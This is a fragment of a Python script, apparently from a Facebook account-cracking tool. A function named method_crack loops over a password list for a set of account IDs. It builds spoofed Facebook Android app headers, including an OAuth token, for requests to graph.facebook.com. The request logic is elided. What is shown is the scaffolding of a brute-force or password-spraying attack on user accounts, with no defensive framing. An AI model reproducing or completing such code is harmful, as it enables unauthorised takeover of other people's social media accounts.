...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            header={'User-Agent': '[FBAN/FB4A;FBAV/275.0.0.10.103;FBBV/294306926;FBDM/density=1.5,width=480,height=800;FBLC/fr_GB;FBRV/183012559;FBCR/Gramee phone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y21s;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '37403', 'X-FB-SIM-HNI': '30698', 'Authorization': 'OAuth 350685531728|A8xUHcvbvsDF7R5OOVRs1NK', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=A8xUHcvbvsDF7R5OOVRs1NK', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'A8xUHcvbvsDF7R5OOVRs1NK'}
